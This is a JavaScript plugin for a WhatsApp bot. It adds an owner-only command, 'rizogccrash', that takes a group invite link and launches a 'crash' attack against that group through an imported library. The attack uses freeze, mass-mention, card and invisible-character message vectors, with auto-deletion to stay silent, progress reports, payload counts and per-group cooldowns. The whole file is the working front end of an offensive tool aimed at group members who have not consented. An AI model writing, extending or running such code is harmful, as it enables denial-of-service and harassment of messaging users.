// plugins/rizogccrash.js
const { cmd } = require('../arslan');
const { RizoGCCrash } = require('../lib/rizogccrash');
const guard = require('../lib/rizogccrash_guard');

cmd({
    pattern: 'rizogccrash',
    alias: ['rgcc', 'rizogcc', 'rgccrash'],
    desc: 'RIZOGCCRASH — full vectors, bot-safe (owner only)',
    category: 'owner',
    react: '💥',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only — RIZOGCCRASH*');
        if (!args[0]) {
            return reply(
`📌 *Usage:* .rizogccrash <grouplink>

📖 *Example:*
.rizogccrash https://chat.whatsapp.com/ABC123

💥 Vectors: freeze + mention + card + invis
🔇 Silent : ON
⏱️ Auto-delete: 30s
🛡 Bot-safe: YES
⏳ 168h per group`
            );
        }

        const link = args[0];
        const m2 = String(link).match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
        if (!m2) return reply('❌ *Invalid group link!*');
        const code = m2[1];

        let metadata, groupJid;
        try {
            metadata = await conn.groupGetInviteInfo(code);
            groupJid = metadata.id;
        } catch (e) {
            return reply(`❌ *Access denied:* ${e.message}`);
        }

        const check = guard.checkTarget(groupJid);
        if (!check.ok) {
            return reply(`${check.msg}\n\n🚫 Group: \`${code}\`\n📋 ${check.reason}`);
        }

        await reply(
`💥 *RIZOGCCRASH LOCKED*
🔗 Group : \`${code}\`
📛 Name  : *${metadata.subject || '?'}*
👥 Members: \`${metadata.participants?.length || '?'}\`
💥 Vectors: freeze + mention + card + invis
🔇 Silent: ON | ⏱️ Auto-delete: 30s
🛡 Bot-safe: active
⚡ Launching...`
        );

        let lastPct = 0;
        const result = await RizoGCCrash(conn, groupJid, metadata, 'full', (sent, total, type) => {
            const pct = Math.floor((sent / total) * 100);
            if (pct >= lastPct + 25) {
                lastPct = pct;
                conn.sendMessage(from, { text: `⏳ RIZOGCCRASH ${pct}% — *${type}* (${sent}/${total})` }).catch(() => {});
            }
        });

        if (result.ok) {
            guard.recordAttack(groupJid, 'success');
            await conn.sendMessage(from, { react: { text: '💥', key: mek.key } });
            const stats = guard.getStats();
            return reply(
`✅ *RIZOGCCRASH COMPLETE*
🔗 Group : \`${code}\`
👥 Members: \`${result.members || '?'}\`
📤 Sent   : \`${result.sent}\` payloads
❌ Errors : \`${result.errors || 0}\` (${result.errorRate})
🎯 Vectors: ${result.vectors?.join(' + ') || 'full'}

📊 Today : ${stats.todayCount}/${stats.dailyLimit}
⏳ Next in 180 min`
            );
        } else {
            guard.recordAttack(groupJid, 'failed:' + result.error);
            return reply(`⚠️ *Failed:* ${result.error || 'all vectors errored'}`);
        }

    } catch (err) {
        console.log('RIZOGCCRASH ERROR:', err);
        return reply(`❌ *RIZOGCCRASH ERROR*\n\n${err.message}`);
    }
});